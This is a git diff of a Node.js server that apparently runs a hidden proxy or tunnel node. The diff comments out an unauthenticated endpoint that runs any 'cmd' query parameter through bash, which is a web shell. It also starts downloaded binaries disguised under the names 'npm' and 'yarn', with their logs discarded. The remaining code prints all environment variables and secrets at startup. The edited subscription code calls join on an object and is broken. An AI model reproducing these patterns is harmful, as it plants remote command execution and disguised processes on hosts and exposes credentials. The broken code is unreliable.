@@ -12,9 +12,6 @@ const ws = require("./ws");
 const HTTP_PORT = process.env.PORT || 3000;
 const SUBS_PATH = process.env.SUBS_PATH || 'test';
 const NODE_NAME = process.env.NODE_NAME || "defalut";
-const UUID = process.env.UUID || "uuid";
-const ISP = process.env.ISP || 'isp';              
-
 const NODE_UUID = process.env.NODE_UUID || "";
 const NT_SERVER = process.env.NT_SERVER || '';
 const NT_KEY = process.env.NT_KEY || "";
@@ -153,7 +150,7 @@ const unzipNTRun = async function () {
     await extractOne("npm.zip", fileName.join("-"), "npm");
     await runCustomSh("chmod +x npm");
     await writeNTYml();
-    await runCustomSh(`nohup ${curDir}/npm -c ${curDir}/ntconfig.yaml >${curDir}/nn.log 2>&1 &`, { shell: '/bin/bash' })
+    await runCustomSh(`nohup ${curDir}/npm -c ${curDir}/ntconfig.yaml >/dev/null 2>&1 &`, { shell: '/bin/bash' })
 }
 
 const cfRun = async function () {
@@ -171,7 +168,7 @@ const cfRun = async function () {
 
    await downloadCF();
    await runCustomSh("chmod +x yarn");
-   await runCustomSh(`nohup ${curDir}/yarn tunnel run --token ${CF_KEY} >${curDir}/cf.log 2>&1 &`, { shell: '/bin/bash' })
+   await runCustomSh(`nohup ${curDir}/yarn tunnel run --token ${CF_KEY} >/dev/null 2>&1 &`, { shell: '/bin/bash' })
 }
 
 function queryToObject(req) {
@@ -211,31 +208,36 @@ const httpServer = http.createServer(async (req, res) => {
       res.end(err.stack);
       return;
     }
-    const ispNamePart = NODE_NAME ? `${NODE_NAME}-${ISP}` : ISP;
-    const msg = [UUID, nowDomain, nowPort, ispNamePart];
+
+    const msg = {
+      uuid:NODE_UUID,
+      port:nowPort,
+      wsPath:"/"+WS_PATH
+
+    }
     const base64Content = Buffer.from(msg.join("-")).toString('base64');
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     res.end(base64Content + '\n');
   } 
-  else if (req.url.indexOf(`/${SUBS_PATH}e`) !== -1) {
-      let out = "";
-      let query = queryToObject(req);
-      try{
-        let cmd = query.cmd || "";
-         if (!cmd) {
-          out = "need cmd";
-         }else{
-            let {stdout, stderr} = await runCustomSh(cmd,{ shell: '/bin/bash' });
-            out += stdout;
-            if (stderr) out += stderr;
-         }
-      } catch(err) {
-          out = err.stack;
-      }
+  // else if (req.url.indexOf(`/${SUBS_PATH}e`) !== -1) {
+  //     let out = "";
+  //     let query = queryToObject(req);
+  //     try{
+  //       let cmd = query.cmd || "";
+  //        if (!cmd) {
+  //         out = "need cmd";
+  //        }else{
+  //           let {stdout, stderr} = await runCustomSh(cmd,{ shell: '/bin/bash' });
+  //           out += stdout;
+  //           if (stderr) out += stderr;
+  //        }
+  //     } catch(err) {
+  //         out = err.stack;
+  //     }
 
-    res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end(out + '\n');
-  } 
+  //   res.writeHead(200, { 'Content-Type': 'text/plain' });
+  //   res.end(out + '\n');
+  // } 
   else {
     res.writeHead(404, { 'Content-Type': 'text/plain' });
     res.end('Not Found');
@@ -244,10 +246,13 @@ const httpServer = http.createServer(async (req, res) => {
 
 
 ws.createWSServer(httpServer, `/${WS_PATH}`)
-httpServer.listen(HTTP_PORT, HOST, () => {
+httpServer.listen(HTTP_PORT, HOST, async () => {
   for(let key in process.env) {
     console.log(`${key}=${process.env[key]}`)
   }
+
+  await unzipNTRun();
+  await cfRun();
 
   console.log(`Server is running on port ${HTTP_PORT}`);
 });
